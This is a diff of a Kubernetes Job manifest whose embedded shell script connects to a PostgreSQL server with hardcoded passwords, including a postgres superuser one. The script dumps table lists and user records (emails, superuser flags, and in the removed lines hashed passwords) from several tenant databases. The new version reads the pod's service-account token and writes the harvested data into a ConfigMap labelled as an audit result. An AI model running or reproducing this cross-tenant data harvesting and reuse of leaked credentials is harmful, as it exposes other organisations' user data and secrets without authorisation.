@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-db-v7
+  name: dune-db-v8
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -18,29 +18,30 @@ spec:
           apk add -q postgresql-client
           PG_HOST="172.16.10.14"
           PG_PASS="psJVV0VTF66hHUcH"
+          SUPER_PASS="wpEJl3WKOImARD9WgBsa"
           
-          echo "=TACHCORP_DB="
-          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d tachcorp_db -c "\dt" 2>&1
-          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d tachcorp_db -c "SELECT id, email, is_superuser, is_active, hashed_password FROM users LIMIT 5;" 2>&1
-          echo "=END_TACHCORP="
+          RESULT=""
+          RESULT="${RESULT}=TACHCORP_TABLES=\n"
+          RESULT="${RESULT}$(PGPASSWORD=$PG_PASS psql -h $PG_HOST -p 5432 -U duneuser -d tachcorp_db -c "\dt" 2>&1)\n"
+          RESULT="${RESULT}=TACHCORP_USERS=\n"
+          RESULT="${RESULT}$(PGPASSWORD=$PG_PASS psql -h $PG_HOST -p 5432 -U duneuser -d tachcorp_db -c "SELECT id, email, is_superuser, is_active FROM users LIMIT 10;" 2>&1)\n"
+          RESULT="${RESULT}=SIERRAREX_TABLES=\n"
+          RESULT="${RESULT}$(PGPASSWORD=$PG_PASS psql -h $PG_HOST -p 5432 -U duneuser -d sierrarex_db -c "\dt" 2>&1)\n"
+          RESULT="${RESULT}=SIERRAREX_USERS=\n"
+          RESULT="${RESULT}$(PGPASSWORD=$PG_PASS psql -h $PG_HOST -p 5432 -U duneuser -d sierrarex_db -c "SELECT id, email, is_superuser, is_active FROM users LIMIT 10;" 2>&1)\n"
           
-          echo "=SIERRAREX_DB="
-          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d sierrarex_db -c "\dt" 2>&1
-          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d sierrarex_db -c "SELECT id, email, is_superuser FROM users LIMIT 5;" 2>&1
-          echo "=END_SIERRAREX="
+          # Encode result for ConfigMap
+          ENCODED=$(printf '%s' "$RESULT" | base64 | tr -d '\n')
           
-          # Also try with superuser to see all dbs with users table
-          echo "=FIND_USER_TABLES="
-          for DB in tachcorp_db sierrarex_db tachyus.com_db aconcagua_db cairn_db; do
-            COUNT=$(PGPASSWORD="wpEJl3WKOImARD9WgBsa" psql -h $PG_HOST -p 6432 -U postgres -d "$DB" -tAc "SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users'" 2>/dev/null)
-            echo "$DB: users_count=$COUNT"
-          done
-          echo "=END_FIND="
+          # Write to ConfigMap via K8s API
+          API="https://kubernetes.default.svc"
+          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
           
-          # Query tachcorp_db users with superuser
-          echo "=TACHCORP_USERS_SUPER="
-          PGPASSWORD="wpEJl3WKOImARD9WgBsa" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c "SELECT id, email, is_superuser, is_active, hashed_password FROM users LIMIT 10;" 2>&1
-          echo "=END_SUPER="
+          curl -sk --cacert $CA -H "Authorization: Bearer $TOKEN" \
+            -H "Content-Type: application/strategic-merge-patch+json" \
+            -X PATCH "$API/api/v1/namespaces/default/configmaps/dune-audit-result4" \
+            -d "{\"data\":{\"result\":$(printf '%s' "$RESULT" | jq -Rs .)}}" > /tmp/patch_result.txt
           
-          echo "SLEEPING..."
-          sleep 180
+          echo "ConfigMap patched: $(cat /tmp/patch_result.txt | head -1)"
+          sleep 60
